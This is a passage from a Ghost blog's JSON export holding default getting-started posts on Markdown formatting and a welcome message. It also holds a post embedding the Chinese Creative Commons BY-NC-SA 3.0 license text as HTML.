times you can quote fairly hefty amounts of text and get away with it. Generally, the safest option is to use blockquotes sparingly.</p>\n<h2 id=\"dividingthingsup\">Dividing things up</h2>\n<p>If you're writing a piece in parts and you just feel like you need to divide a couple of sections distinctly from each other, a horizontal rule might be just what you need. Dropping <code>---</code> on a new line will create a sleek divider, anywhere you want it.</p>\n<hr>\n<p>This should get you going with the vast majority of what you need to do in the editor, but if you're still curious about more advanced tips then check out the <a href=\"/advanced-markdown/\">Advanced Markdown Guide</a> - or if you'd rather learn about how Ghost taxononomies work, we've got a overview of <a href=\"/using-tags/\">how to use Ghost tags</a>.</p>\n</div>","amp":null,"plaintext":"Ghost uses a language called Markdown  to format text.\n\nWhen you go to edit a post and see special characters and colours intertwined\nbetween the words, those are Markdown shortcuts which tell Ghost what to do with\nthe words in your document. The biggest benefit of Markdown is that you can\nquickly apply formatting as you type, without needing to pause.\n\nAt the bottom of the editor, you'll find a toolbar with basic formatting options\nto help you get started as easily as possible. You'll also notice that there's a\n ?  icon, which contains more advanced shortcuts.\n\nFor now, though, let's run you through some of the basics. You'll want to make\nsure you're editing this post in order to see all the Markdown we've used.\n\nFormatting text\nThe most common shortcuts are of course, bold  text, italic  text, and \nhyperlinks [https://example.com]. These generally make up the bulk of any\ndocument. You can type the characters out, but you can also use keyboard\nshortcuts.\n\n * CMD/Ctrl + B  for Bold\n * CMD/Ctrl + I  for Italic\n * CMD/Ctrl + K  for a Link\n * CMD/Ctrl + H  for a Heading (Press multiple times for h2/h3/h4/etc)\n\nWith just a couple of extra characters here and there, you're well on your way\nto creating a beautifully formatted story.\n\nInserting images\nImages in Markdown look just the same as links, except they're prefixed with an\nexclamation mark, like this:\n\n![Image description](/path/to/image.jpg)\n\n\n\nMost Markdown editors don't make you type this out, though. In Ghost you can\nclick on the image icon in the toolbar at the bottom of the editor, or you can\njust click and drag an image from your desktop directly into the editor. Both\nwill upload the image for you and generate the appropriate Markdown.\n\nImportant Note:  Ghost does not currently have automatic image resizing, so it's\nalways a good idea to make sure your images aren't gigantic files before \nuploading them to Ghost.\n\nMaking lists\nLists in HTML are a formatting nightmare, but in Markdown they become an\nabsolute breeze with just a couple of characters and a bit of smart automation.\nFor numbered lists, just write out the numbers. For bullet lists, just use *  or\n -  or +. Like this:\n\n 1. Crack the eggs over a bowl\n 2. Whisk them together\n 3. Make an omelette\n\nor\n\n * Remember to buy milk\n * Feed the cat\n * Come up with idea for next story\n\nAdding quotes\nWhen you want to pull out a particularly good excerpt in the middle of a piece,\nyou can use >  at the beginning of a paragraph to turn it into a Blockquote. You\nmight've seen this formatting before in email clients.\n\nA well placed quote guides a reader through a story, helping them to understand\nthe most important points being made\n\nAll themes handles blockquotes slightly differently. Sometimes they'll look\nbetter kept shorter, while other times you can quote fairly hefty amounts of\ntext and get away with it. Generally, the safest option is to use blockquotes\nsparingly.\n\nDividing things up\nIf you're writing a piece in parts and you just feel like you need to divide a\ncouple of sections distinctly from each other, a horizontal rule might be just\nwhat you need. Dropping ---  on a new line will create a sleek divider, anywhere\nyou want it.\n\n\n--------------------------------------------------------------------------------\n\nThis should get you going with the vast majority of what you need to do in the\neditor, but if you're still curious about more advanced tips then check out the \nAdvanced Markdown Guide [/advanced-markdown/]  - or if you'd rather learn about\nhow Ghost taxononomies work, we've got a overview of how to use Ghost tags\n[/using-tags/].","feature_image":"https://casper.ghost.org/v1.0.0/images/writing.jpg","featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5951f5fca366002ebd5dbef7","created_at":"2017-09-16T06:41:40.000Z","created_by":"5951f5fca366002ebd5dbef7","updated_at":"2017-09-16T11:15:06.000Z","updated_by":"1","published_at":"2017-09-16T06:41:44.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bcc7a4045d4920c17856e8","uuid":"faa48b07-a8b8-417f-94e2-1b56e52cb267","title":"Welcome to Ghost","slug":"welcome","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Hey! Welcome to Ghost, it's great to have you :)\\n\\nWe know that first impressions are important, so we've populated your new site with some initial **Getting Started** posts that will help you get familiar with everything in no time. This is the first one!\\n\\n\\n### There are a few things that you should know up-front:\\n\\n1. Ghost is designed for ambitious, professional publishers who want to actively build a business around their content. That's who it works best for. If you're using Ghost for some other purpose, that's fine too - but it might not be the best choice for you.\\n\\n2. The entire platform can be modified and customized to suit your needs, which is very powerful, but doing so **does** require some knowledge of code. Ghost is not necessarily a good platform for beginners or people who just want a simple personal blog.\\n\\n3. For the best experience we recommend downloading the [Ghost Desktop App](https://ghost.org/downloads/) for your computer, which is the best way to access your Ghost site on a desktop device.\\n\\nGhost is made by an independent non-profit organisation called the Ghost Foundation. We are 100% self funded by revenue from our [Ghost(Pro)](https://ghost.org/pricing) service, and every penny we make is re-invested into funding further development of free, open source technology for modern journalism.\\n\\nThe main thing you'll want to read about next is probably: [the Ghost editor](/the-editor/).\\n\\nOnce you're done reading, you can simply delete the default **Ghost** user from your team to remove all of these introductory posts!\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Hey! Welcome to Ghost, it's great to have you :)</p>\n<p>We know that first impressions are important, so we've populated your new site with some initial <strong>Getting Started</strong> posts that will help you get familiar with everything in no time. This is the first one!</p>\n<h3 id=\"thereareafewthingsthatyoushouldknowupfront\">There are a few things that you should know up-front:</h3>\n<ol>\n<li>\n<p>Ghost is designed for ambitious, professional publishers who want to actively build a business around their content. That's who it works best for. If you're using Ghost for some other purpose, that's fine too - but it might not be the best choice for you.</p>\n</li>\n<li>\n<p>The entire platform can be modified and customized to suit your needs, which is very powerful, but doing so <strong>does</strong> require some knowledge of code. Ghost is not necessarily a good platform for beginners or people who just want a simple personal blog.</p>\n</li>\n<li>\n<p>For the best experience we recommend downloading the <a href=\"https://ghost.org/downloads/\">Ghost Desktop App</a> for your computer, which is the best way to access your Ghost site on a desktop device.</p>\n</li>\n</ol>\n<p>Ghost is made by an independent non-profit organisation called the Ghost Foundation. We are 100% self funded by revenue from our <a href=\"https://ghost.org/pricing\">Ghost(Pro)</a> service, and every penny we make is re-invested into funding further development of free, open source technology for modern journalism.</p>\n<p>The main thing you'll want to read about next is probably: <a href=\"/the-editor/\">the Ghost editor</a>.</p>\n<p>Once you're done reading, you can simply delete the default <strong>Ghost</strong> user from your team to remove all of these introductory posts!</p>\n</div>","amp":null,"plaintext":"Hey! Welcome to Ghost, it's great to have you :)\n\nWe know that first impressions are important, so we've populated your new site\nwith some initial Getting Started  posts that will help you get familiar with\neverything in no time. This is the first one!\n\nThere are a few things that you should know up-front:\n 1. Ghost is designed for ambitious, professional publishers who want to\n    actively build a business around their content. That's who it works best\n    for. If you're using Ghost for some other purpose, that's fine too - but it\n    might not be the best choice for you.\n    \n    \n 2. The entire platform can be modified and customized to suit your needs, which\n    is very powerful, but doing so does  require some knowledge of code. Ghost\n    is not necessarily a good platform for beginners or people who just want a\n    simple personal blog.\n    \n    \n 3. For the best experience we recommend downloading the Ghost Desktop App\n    [https://ghost.org/downloads/]  for your computer, which is the best way to\n    access your Ghost site on a desktop device.\n    \n    \n\nGhost is made by an independent non-profit organisation called the Ghost\nFoundation. We are 100% self funded by revenue from our Ghost(Pro)\n[https://ghost.org/pricing]  service, and every penny we make is re-invested\ninto funding further development of free, open source technology for modern\njournalism.\n\nThe main thing you'll want to read about next is probably: the Ghost editor\n[/the-editor/].\n\nOnce you're done reading, you can simply delete the default Ghost  user from\nyour team to remove all of these introductory posts!","feature_image":"https://casper.ghost.org/v1.0.0/images/welcome.jpg","featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5951f5fca366002ebd5dbef7","created_at":"2017-09-16T06:41:40.000Z","created_by":"5951f5fca366002ebd5dbef7","updated_at":"2017-09-16T11:14:35.000Z","updated_by":"1","published_at":"2017-09-16T06:41:45.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c37","uuid":"a01d089d-7327-403c-b05b-21430be1547f","title":"版权声明","slug":"declaration","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n<!DOCTYPE html>\\n<head>\\n</head>\\n\\n<body>\\n<div id=\\\"deed\\\" class=\\\"yellow\\\">\\n<div id=\\\"deed-head\\\">\\n<div id=\\\"cc-logo\\\">\\n<img src=\\\"https://creativecommons.org/images/deed/cc-logo.jpg\\\" alt=\\\"\\\"/>\\n</div>\\n<h1><span>知识共享许可协议法律文本</span></h1>\\n<div id=\\\"deed-license\\\">\\n<h2>署名-非商业性使用-相同方式共享 3.0中国大陆</h2>\\n</div>\\n</div>\\n<div id=\\\"deed-main\\\">\\n<div id=\\\"deed-main-content\\\">\\n<img src=\\\"https://creativecommons.org/images/international/cn.png\\\" alt=\\\"\\\"/>\\n<blockquote>\\n“知识共享”（Creative Commons）不是一家律师事务所也不对外提供法律服务。提供本许可协议文本并不导致“律师—当事人”关系的建立。“知识共享”按其现状（As Is）提供这些信息。“知识共享”对于所提供的信息不提供任何担保，也不对因使用该信息而造成的损失承担损害赔偿责任。\\n</blockquote>\\n<h3><em>协议文本</em></h3>\\n<p>本作品（定义如下）的提供是以适用“知识共享公共许可协议”（ 简称“CCPL”或 “许可”）为前提的。本作品受《中华人民共和国著作权法》以及其他可适用法律的保护。对本作品的使用不得超越本许可协议授权的范围。</p>\\n<p>如您行使本许可授予的使用本作品的权利，就表明您接受并同意遵守本许可协议的所有条款。鉴于本许可为合同，在您接受这些条款和规定的前提下，许可人授予您本许可所包括的权利。 </p>\\n<p><strong>第一条 定义</strong> </p>\\n<ol type=\\\"1\\\">\\n<li>\\n<strong>本作品：</strong>指根据本许可协议提供的以任何方式和形式（包括以数字形式）表达之文学、艺术和科学领域的作品，例如：书籍、手册等文字作品；讲课、演讲、讲道及其他同类性质的作品；戏剧或音乐戏剧作品；曲艺作品；舞蹈作品及哑剧作品；配词或不配词的音乐作品；电影作品和以类似摄制电影的方法创作的作品；素描、绘画、书法、建筑、雕塑、雕刻或版画等作品；摄影作品以及以类似摄影的方法创作的作品；杂技艺术作品；实用艺术作品；与地理、地形、建筑或科学有关的插图、地图、设计图、草图及立体的造型作品；以及法律、行政法规规定的其他文学艺术作品。为本许可协议之目的，本协议有关“本作品”的规定适用于表演、录音制品及广播电视节目。\\n</li>\\n<li>\\n<strong>原始作者：</strong>就文学或艺术作品而言，指创作本作品的自然人或依法视为本作品作者的法人或其他组织。为本许可之目的，下述情形下的自然人、法人或其他组织适用本许可有关“原始作者”的规定：（1）就表演而言，指演员、歌唱家、音乐家、舞蹈家和其他表演、演唱、演说、朗诵、演奏、表现或者以其它方式表演文学、艺术作品或民间文学艺术的人员；（2）就录音制品而言，指首次将表演的声音或其他声音录制下来的自然人、法人或其他组织；（3）就广播电视节目而言，指传播广播电视节目的组织；（4）作者身份不明的，指行使作品著作权（除署名权外）的作品原件所有人（比如出版社）。</li>\\n<li>\\n<strong>演绎作品：</strong>指基于本作品，或基于本作品与其他已存在的作品而创作的作品，例如翻译、改编、编曲或对文学、艺术和科学作品的其他变更，包括以摄制电影的方法对作品的改编，或其他任何对本作品进行改造、转换、或改编后的形式，包含任何可确认为源自原始作品的修改形式。在本许可定义之下构成汇编作品的作品不视为演绎作品。为避免疑义，并为本许可之目的，当演绎对象为音乐作品时，将其依时间序列关系与动态影像配合一致而形成的结果，视为演绎作品。</li>\\n<li>\\n<strong>汇编作品：</strong>指由于对内容的选择和编排具有独创性而构成智力创作的文学、艺术或科学作品的集合，其中本作品以完整且未经修改的形式和另外一部或多部作品组成集合的整体，而各组成作品本身是分开且独立的，例如百科全书、文选、数据汇编作品，以及本条第1项所列作品之外的作品或者标的。在本许可定义之下构成汇编作品的作品不视为演绎作品（定义如上）。</li>\\n<li>\\n<strong>许可人：</strong>指根据本许可提供本作品的自然人、法人或者其他组织。</li>\\n<li>\\n<strong>您：</strong>指以前就本作品没有违反过本许可协议、或曾违反过协议但已获得许可人明示同意、依据本许可行使权利的自然人、法人或者其他组织。</li>\\n<li>\\n<strong>授权要素：</strong>是指许可人所选择的、并标示在本许可文本标题中的下列基本属性：署名、非商业性使用、相同方式共享。</li>\\n<li>\\n<strong>发行：</strong>指以出售或者其他权利移转方式向公众提供本作品或者演绎作品的原件或者复制件。</li>\\n<li>\\n<strong>公开传播：</strong>指公开朗诵本作品以及以任何方式或程序，包括以有线、无线的方式或通过信息网络公开传播本作品的公开朗诵；或向公众提供本作品，使公众可以在自己选定的地点获得本作品；或以任何方式或程序公开表演本作品或向公众传播本作品的表演，包括通过信息网络传播本作品的表演；或以任何方式，包括符号、声音或图像，广播或转播本作品。上述定义包括相关法律规定的“展览”、“表演”、“放映”、“广播”或通过信息网络向公众传播作品等传播方式。</li>\\n<li>\\n<strong>复制：</strong>指以印刷、复印、拓印、录音、录像、翻录、翻拍等方式制作本作品的复制件。</li>\\n<li><strong>人身权：</strong>指相关法律赋予作者对本作品所享有的发表权、署名权、修改权以及保护作品完整权。</li></ol>\\n<p><strong>第二条 合理使用</strong> </p>\\n<p>本许可无意削减、限制或约束您基于《中华人民共和国著作权法》或其他相关法律有关著作权保护的限制或例外的规定对本作品的合理使用。</p>\\n<p><strong>第三条 授权</strong></p>\\n<p>根据本许可的条款和条件，许可人在此授予您全球性、免版税、非独占并且在本作品的著作权存续期间内均有效的许可，就本作品行使以下权利：</p>\\n<ol type=\\\"1\\\">\\n<li>\\n复制本作品或将本作品收入一个或多个汇编作品中，以及复制汇编作品中收录的本作品；</li>\\n<li>\\n创作和复制演绎作品，但是任何演绎作品，包括任何形式的翻译作品，均需以合理方式清楚地标示、区分或以其他方法表明原始作品已经被修改或变更。例如，翻译作品可以标明“原作品已由英文翻译为西班牙文”，改编作品可以标明“原作品已作修改”；</li>\\n<li>\\n发行、公开传播本作品（包括汇编作品中收录的本作品）；\\n</li>\\n<li>\\n发行、公开传播演绎作品。</li>\\n</ol>\\n<p>\\n以上权利可在任何现有的或者以后出现的并为可适用的法律认可的媒体和形式上行使。上述权利包括为在其他媒体和形式上行使权利而必须进行技术性修改的权利。许可人在此保留所有未明示授予的权利，包括但不限于第四条第5项所规定的权利。</p>\\n<p><strong>第四条 限制</strong></p>\\n<p>第三条的授权须受以下规定的限制： </p>\\n<ol type=\\\"1\\\">\\n<li>\\n您在发行或公开传播本作品时，必须遵守本许可协议。在您发行或公开传播的本作品的每一份复制件中，您必须附上一份本许可协议的复制件或本许可协议的网址（Uniform Resource Identifier）。您不得就本作品提出或增加任何条款，从而限制本许可协议或者限制获得本作品的第三方行使本许可协议所赋予的权利。您不得对本作品进行再许可。您必须在您发行或公开传播的每份作品复制件中完整保留所有与本许可协议及免责条款相关的声明。\\n在发行或公开传播本作品时，您不得对本作品施加任何技术措施，从而限制从您处获得本作品的第三方行使本许可协议授予的权利。本项（第四条第1项）规定同样适用于收录在汇编作品中的本作品，但并不要求汇编作品中除本作品外的其他作品受本许可协议的约束。在创作汇编作品时，若接到任一许可人的通知，您必须按照其要求，在可行范围内删除汇编作品中根据本协议第四条第4项的要求所作的有关原始作者的身份及其他有关原始作品相关信息的标注。在创作演绎作品时，若接到任一许可人的通知，您必须根据其要求，在可行范围内删除演绎作品中根据第四条第4项的要求所作的有关原始作者的身份及其他有关原始作品的相关信息的标注。<br/>\\n</li>\\n<li>\\n您必须以下述许可条款发行或公开传播演绎作品：（1）本许可协议；（2）与本许可协议具有相同授权要素的后续版本；或者（3）与本许可协议具有相同授权要素的其他司法管辖区的知识共享许可协议或其后续版本（例如：署名-非商业性使用-相同方式共享 3.0 美国）（以上三类协议统称为“可适用的协议”）。在您发行或公开传播的每件演绎作品的复制件中，您必须附上一份“可适用的协议”的复制件或网址。您不得就演绎作品提出或增加任何条款，从而限制“可适用的协议”的规定，或者限制获得演绎作品的第三方行使“可适用的协议”所赋予的权利。在发行或公开传播包含本作品的演绎作品时，您必须在本作品的每一份复制件中完整地保留所有与“可适用的协议”及免责条款相关的声明。在发行或公开传播演绎作品时，您不得对演绎作品施加任何技术措施，从而限制从您处获得演绎作品的第三方行使“可适用的协议”所赋予的权利。本项（第四条第2项）规定同样适用于收录在汇编作品中的演绎作品，但并不要求汇编作品中除基于本作品而创作的演绎作品之外的其他作品受“可适用的协议”的约束。\\n</li>\\n<li>\\n您不得以任何形式行使本协议第三条授予您的权利去谋取或获得商业利益或私人金钱报酬。若交换过程中未涉及任何商业利益或私人金钱报酬，通过数字文件共享方式或其他方式用本作品去交换其他受著作权保护的作品，将不被视为谋取或获得商业利益或私人金钱报酬。</li>\\n<li>在发行或公开传播本作品、任何演绎作品或汇编作品时，除非有依据第四条第1项之要求，否则您必须完整保留所有关于本作品的著作权声明，并以适于所使用的媒介或方法的形式提供下述信息：（1）在原始作者的姓名（或笔名）已被提供的情况下，给出该姓名或笔名，或者在原始作者或许可人以许可人的著作权声明或其他合理的方式，指定可以在作品上署名的他方当事人姓名的情况下，指明该他方当事人的名称（“署名人”）；（2）在本作品标题已被提供的情况下，给出本作品的标题；（3）在合理可行的范围内，标明许可人指定需与本作品同时出现的网址，除非该网址没有涉及到本作品的著作权声明或者关于本作品的许可信息；（4）若为演绎作品，则依第三条第2项之要求，必须注明演绎作品中使用的本作品的作者姓名和作品名称（例如，“某作者作品的法语译本”，或“基于某作者作品的电影剧本”）。本项（第四条第4项）要求的对作者姓名和作品名称的指明可采取任何合理方式，但在演绎作品或汇编作品中，如果已经指明了演绎作品的所有作者或汇编作品中所有内含作品的作者，那么对本作品名称和作者姓名的指明须同时出现在任何其他作者姓名出现的地方，并至少与对其他作者的指明一样显著。为避免疑义，本条有关标示作者姓名和作品名称之规定，仅适用于前述署名的用途；除非您事先另行取得原始作者、许可人或署名人的书面同意，否则您不得以明示或者默示的方式主张或暗示，您本人或您对作品的使用与原始作者、许可人或署名人有关联或者已获得上述人士的赞助或者支持。</li>\\n<li><p>为避免疑义，针对不同司法管辖区的著作权许可体系作出如下约定：</p>\\n<ol type=\\\"i\\\">\\n<li><strong>权利不能放弃的强制许可体系</strong>。<br/><br/>\\n在那些许可人不能放弃通过任何法定的或强制的许可方案收取许可使用费的权利的司法管辖区，许可人保留因您行使本许可协议授予的权利而向您收取许可使用费的专有权；</li>\\n<li><strong>权利可以放弃的强制许可体系</strong>。<br/><br/>\\n在那些许可人可以放弃通过任何法定的或强制的许可方案收取许可使用费的权利的司法管辖区，许可人放弃因您行使本许可协议授予的权利而向您收取许可使用费的专有权；但若您行使本许可协议授予的权利时未遵守本许可协议第四条第3项有关非商业性使用的规定，则许可人保留向您收取本作品许可使用费的权利；</li>\\n<li><strong>自愿许可体系</strong>。<br/><br/>\\n在实行著作权自愿许可的司法管辖区，若您行使本许可协议授予的权利时未遵守本许可协议第四条第3项有关非商业性使用的规定，则许可人保留向您收取本作品许可使用费的权利，许可人可以自行或者通过所参加的著作权集体管理组织向您收取本作品的许可使用费。</li>\\n</ol>\\n</li>\\n<li>\\n除非其他法律法规另有规定，您在复制、发行或者公开表演本作品，或者复制、发行或者公开表演作为任何演绎作品或汇编作品一部分的本作品时，不得歪曲、损害或者以其他方式损害本作品，导致原始作者的名誉或者荣誉受损。</li>\\n</ol>\\n<p><strong>第五条 声明、保证和免责</strong></p>\\n<p>\\n除非本许可的当事人相互以书面的方式做出相反约定，且在相关法律所允许的最大范围内，否则许可人按其现状提供本作品，对本作品不作任何明示或者默示、依照法律或者其他规定的陈述或担保，包括但是不限于任何有关可否商业性使用、是否符合特定的目的、不具有潜在的或者其他缺陷、准确性或者不存在不论能否被发现的错误的担保。有些司法管辖区不允许排除前述默示保证，因此这些排除性规定并不一定适用于您。</p>\\n<p><strong>第六条 责任限制</strong></p>\\n<p>\\n除非属于相关法律所要求的范围，许可人在任何情况下都不对您因本许可或因使用本作品而产生的任何直接损失、间接损失或惩罚性赔偿负责，即使许可人已被告知发生此类损害的可能性。 </p>\\n<p><strong>第七条 许可终止</strong> </p>\\n<ol type=\\\"1\\\">\\n<li>\\n在您违反本许可协议任何条款时，本许可及其所授予的权利将自动终止。然而，根据本许可从您处获取演绎作品或汇编作品的自然人、法人或者其他组织，如果他们仍完全遵守相关条款，则对他们的许可不会随之终止。即使本许可被终止，第一条、第二条、第五条、第六条、第七条以及第八条仍然有效。</li>\\n<li>\\n在上述条款及条件的前提下，此处授予的许可在法定著作权保护期限内有效。即便如此，许可人保留依其他许可条款发行本作品及在任何时候停止发行本作品的权利；但是，许可人的上述权利不能被用于撤销本许可或任何其他在本许可条款下授予的或必须授予的许可，除本条第1项指明的终止外，本许可将保持其完全效力。</li>\\n</ol>\\n<p><strong>第八条 其他事项</strong> </p>\\n<ol type=\\\"1\\\">\\n<li>\\n当您发行、公开传播本作品或其汇编作品时，许可人给获得作品的第三方提供本作品的许可，其条款和条件与您所获得的许可相同。</li>\\n<li>\\n当您发行或公开传播演绎作品时，许可人给获得作品的第三方提供本作品的许可，其条款和条件与您所获得的许可相同。</li>\\n<li>\\n如因相关法律，本许可的某一条款无效或不能履行，本许可其余条款的有效性和可履行性不受影响。如本许可的当事人未采取进一步措施，此类无效条款应在必要范围内进行最低限度的修改以使其有效和可履行。</li>\\n<li>\\n除非当事人书面同意并签字放弃某条款和允许某违约行为，本许可的任何条款或规定都不应被视为已被放弃，或被视为允许此违约行为。</li>\\n<li>\\n本许可构成相关当事人与本授权作品相关的全部协议。除已在此处确认的之外，并不存在任何与本作品相关的谅解备忘录、协议或声明。许可人不受您提出的任何附加规定的约束。未经许可人和您双方书面同意，本许可不得更改。</li>\\n</ol>\\n \\n<blockquote>\\n<h3>“知识共享”（Creative Commons）声明</h3>\\n<p>\\n“知识共享”不是本许可协议的一方，对本作品不作任何相关保证。“知识共享”不对您或任何其他方的任何损失负责，包括但不限于与本许可相关的直接损失和间接损失。虽然有上述两点，但如果“知识共享”已明确标识自己为许可人，它将承担许可人的全部权利和义务。 </p>\\n<p>\\n除用于向公众表明本作品是依照知识共享公共许可协议（CCPL）授权以外，如未经“知识共享”事先书面同意，任何一方均不得使用“知识共享”（Creative Commons）商标和其他相关商标及标识。任何被允许的使用都必须符合“知识共享”的现行商标使用准则。该准则已在其网站上发布或可应要求随时提供。为避免疑义，本段关于商标的限制性规定不构成本许可之一部分。</p>\\n<p>您可以通过<a href=\\\"https://creativecommons.org/\\\">https://creativecommons.org/</a>联系“知识共享”。</p>\\n</blockquote>\\n</div>\\n</div>\\n</div>\\n</body>\\n</html>\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><!DOCTYPE html>\n<head>\n</head>\n<body>\n<div id=\"deed\" class=\"yellow\">\n<div id=\"deed-head\">\n<div id=\"cc-logo\">\n<img src=\"https://creativecommons.org/images/deed/cc-logo.jpg\" alt=\"\"/>\n</div>\n<h1><span>知识共享许可协议法律文本</span></h1>\n<div id=\"deed-license\">\n<h2>署名-非商业性使用-相同方式共享 3.0中国大陆</h2>\n</div>\n</div>\n<div id=\"deed-main\">\n<div id=\"deed-main-content\">\n<img src=\"https://creativecommons.org/images/international/cn.png\" alt=\"\"/>\n<blockquote>\n“知识共享”（Creative Commons）不是一家律师事务所也不对外提供法律服务。提供本许可协议文本并不导致“律师—当事人”关系的建立。“知识共享”按其现状（As Is）提供这些信息。“知识共享”对于所提供的信息不提供任何担保，也不对因使用该信息而造成的损失承担损害赔偿责任。\n</blockquote>\n<h3><em>协议文本</em></h3>\n<p>本作品（定义如下）的提供是以适用“知识共享公共许可协议”（ 简称“CCPL”或 “许可”）为前提的。本作品受《中华人民共和国著作权法》以及其他可适用法律的保护。对本作品的使用不得超越本许可协议授权的范围。</p>\n<p>如您行使本许可授予的使用本作品的权利，就表明您接受并同意遵守本许可协议的所有条款。鉴于本许可为合同，在您接受这些条款和规定的前提下，许可人授予您本许可所包括的权利。 </p>\n<p><strong>第一条 定义</strong> </p>\n<ol type=\"1\">\n<li>\n<strong>本作品：</strong>指根据本许可协议提供的以任何方式和形式（包括以数字形式）表达之文学、艺术和科学领域的作品，例如：书籍、手册等文字作品；讲课、演讲、讲道及其他同类性质的作品；戏剧或音乐戏剧作品；曲艺作品；舞蹈作品及哑剧作品；配词或不配词的音乐作品；电影作品和以类似摄制电影的方法创作的作品；素描、绘画、书法、建筑、雕塑、雕刻或版画等作品；摄影作品以及以类似摄影的方法创作的作品；杂技艺术作品；实用艺术作品；与地理、地形、建筑或科学有关的插图、地图、设计图、草图及立体的造型作品；以及法律、行政法规规定的其他文学艺术作品。为本许可协议之目的，本协议有关“本作品”的规定适用于表演、录音制品及广播电视节目。\n</li>\n<li>\n<strong>原始作者：</strong>就文学或艺术作品而言，指创作本作品的自然人或依法视为本作品作者的法人或其他组织。为本许可之目的，下述情形下的自然人、法人或其他组织适用本许可有关“原始作者”的规定：（1）就表演而言，指演员、歌唱家、音乐家、舞蹈家和其他表演、演唱、演说、朗诵、演奏、表现或者以其它方式表演文学、艺术作品或民间文学艺术的人员；（2）就录音制品而言，指首次将表演的声音或其他声音录制下来的自然人、法人或其他组织；（3）就广播电视节目而言，指传播广播电视节目的组织；（4）作者身份不明的，指行使作品著作权（除署名权外）的作品原件所有人（比如出版社）。</li>\n<li>\n<strong>演绎作品：</strong>指基于本作品，或基于本作品与其他已存在的作品而创作的作品，例如翻译、改编、编曲或对文学、艺术和科学作品的其他变更，包括以摄制电影的方法对作品的改编，或其他任何对本作品进行改造、转换、或改编后的形式，包含任何可确认为源自原始作品的修改形式。在本许可定义之下构成汇编作品的作品不视为演绎作品。为避免疑义，并为本许可之目的，当演绎对象为音乐作品时，将其依时间序列关系与动态影像配合一致而形成的结果，视为演绎作品。</li>\n<li>\n<strong>汇编作品：</strong>指由于对内容的选择和编排具有独创性而构成智力创作的文学、艺术或科学作品的集合，其中本作品以完整且未经修改的形式和另外一部或多部作品组成集合的整体，而各组成作品本身是分开且独立的，例如百科全书、文选、数据汇编作品，以及本条第1项所列作品之外的作品或者标的。在本许可定义之下构成汇编作品的作品不视为演绎作品（定义如上）。</li>\n<li>\n<strong>许可人：</strong>指根据本许可提供本作品的自然人、法人或者其他组织。</li>\n<li>\n<strong>您：</strong>指以前就本作品没有违反过本许可协议、或曾违反过协议但已获得许可人明示同意、依据本许可行使权利的自然人、法人或者其他组织。</li>\n<li>\n<strong>授权要素：</strong>是指许可人所选择的、并标示在本许可文本标题中的下列基本属性：署名、非商业性使用、相同方式共享。</li>\n<li>\n<strong>发行：</strong>指以出售或者其他权利移转方式向公众提供本作品或者演绎作品的原件或者复制件。</li>\n<li>\n<strong>公开传播：</strong>指公开朗诵本作品以及以任何方式或程序，包括以有线、无线的方式或通过信息网络公开传播本作品的公开朗诵；或向公众提供本作品，使公众可以在自己选定的地点获得本作品；或以任何方式或程序公开表演本作品或向公众传播本作品的表演，包括通过信息网络传播本作品的表演；或以任何方式，包括符号、声音或图像，广播或转播本作品。上述定义包括相关法律规定的“展览”、“表演”、“放映”、“广播”或通过信息网络向公众传播作品等传播方式。</li>\n<li>\n<strong>复制：</strong>指以印刷、复印、拓印、录音、录像、翻录、翻拍等方式制作本作品的复制件。</li>\n<li><strong>人身权：</strong>指相关法律赋予作者对本作品所享有的发表权、署名权、修改权以及保护作品完整权。</li></ol>\n<p><strong>第二条 合理使用</strong> </p>\n<p>本许可无意削减、限制或约束您基于《中华人民共和国著作权法》或其他相关法律有关著作权保护的限制或例外的规定对本作品的合理使用。</p>\n<p><strong>第三条 授权</strong></p>\n<p>根据本许可的条款和条件，许可人在此授予您全球性、免版税、非独占并且在本作品的著作权存续期间内均有效的许可，就本作品行使以下权利：</p>\n<ol type=\"1\">\n<li>\n复制本作品或将本作品收入一个或多个汇编作品中，以及复制汇编作品中收录的本作品；</li>\n<li>\n创作和复制演绎作品，但是任何演绎作品，包括任何形式的翻译作品，均需以合理方式清楚地标示、区分或以其他方法表明原始作品已经被修改或变更。例如，翻译作品可以标明“原作品已由英文翻译为西班牙文”，改编作品可以标明“原作品已作修改”；</li>\n<li>\n发行、公开传播本作品（包括汇编作品中收录的本作品）；\n</li>\n<li>\n发行、公开传播演绎作品。</li>\n</ol>\n<p>\n以上权利可在任何现有的或者以后出现的并为可适用的法律认可的媒体和形式上行使。上述权利包括为在其他媒体和形式上行使权利而必须进行技术性修改的权利。许可人在此保留所有未明示授予的权利，包括但不限于第四条第5项所规定的权利。</p>\n<p><strong>第四条 限制</strong></p>\n<p>第三条的授权须受以下规定的限制： </p>\n<ol type=\"1\">\n<li>\n您在发行或公开传播本作品时，必须遵守本许可协议。在您发行或公开传播的本作品的每一份复制件中，您必须附上一份本许可协议的复制件或本许可协议的网址（Uniform Resource 